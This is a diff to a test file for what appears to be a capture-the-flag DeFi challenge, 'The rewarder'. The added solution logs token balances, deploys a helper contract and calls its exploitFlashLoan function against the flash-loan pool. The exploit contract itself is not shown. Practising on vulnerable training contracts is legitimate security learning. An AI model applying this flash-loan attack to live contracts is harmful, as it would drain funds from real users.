@@ -70,6 +70,19 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log('AliceBalance', parseInt(await liquidityToken.balanceOf(alice.address)));
+        console.log('PlayerBalance', parseInt(await liquidityToken.balanceOf(player.address)));
+
+        const Broker = await ethers.getContractFactory('auxSC', player);
+        let broker = await Broker.deploy(liquidityToken.address,flashLoanPool.address);
+
+        broker.connect(player).exploitFlashLoan(100000);
+
+
+
+
+
+
     });
 
     after(async function () {
